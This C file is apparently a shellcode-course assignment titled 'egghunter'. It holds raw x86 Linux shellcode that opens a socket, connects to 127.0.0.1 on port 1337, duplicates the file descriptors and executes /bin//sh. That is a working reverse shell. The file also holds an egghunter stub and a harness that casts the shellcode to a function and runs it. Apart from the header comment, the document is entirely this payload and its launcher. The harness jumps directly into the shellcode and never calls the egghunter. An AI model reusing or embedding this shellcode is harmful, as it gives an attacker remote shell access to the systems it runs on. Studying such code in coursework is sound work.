/* Filename: egghunter.c
 Author: Eric Van Zutphen
 SLAE Assignment 3
 SLAE ID: SLAE - 1140 */

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x13\x37\x13\x37"
"\xeb\x6e\x31\xc0\x31\xdb\x31\xc9\x5a\x6a\x06\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc6"
"\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x00\x00\x01\x83\xec\x04\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10"
"\x51\x56\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\x89\xf3\xcd\x80\x89\xc6\x75"
"\xf4\x89\xc8\x31\xc1\x51\xc7\x44\x24\xfc\x6e\x2f\x73\x68\xc7\x44\x24\xf8\x2f\x2f\x62\x69\x83\xec\x08"
"\x89\xe3\x51\x53\xb0\x0b\x89\xe1\x31\xd2\xcd\x80\xe8\x8d\xff\xff\xff";

unsigned char egghunter[] = \
"\xeb\x24\x5f\x83\xef\x14\xc7\x40\xfc\x37\x13\x37\x13\x83\xe8\x04\x89\xcb\x31\xd9\x66\xb9\xff\xff\xfd"
"\xaf\x74\x05\x83\xc7\x03\xe2\xf8\x83\xc7\x08\xff\xe7\xe8\xd7\xff\xff\xff";

int main()
{
        printf("Shellcode Length:  %d\n", strlen(egghunter));
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code+4;

        ret();
}